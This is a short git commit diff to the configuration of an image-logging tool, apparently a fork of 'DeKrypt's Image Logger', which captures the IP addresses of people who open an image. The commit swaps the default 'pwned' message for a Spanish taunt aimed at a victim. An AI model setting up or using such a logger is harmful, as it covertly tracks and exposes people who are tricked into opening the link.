3d60896a0e7491d1f88fb832e205301ccd84fcd3
Reblix <108966661+Reblix22@users.noreply.github.com>
2024-03-24 16:49:37 -0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "Caiste chanchito mi loco buena ip", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
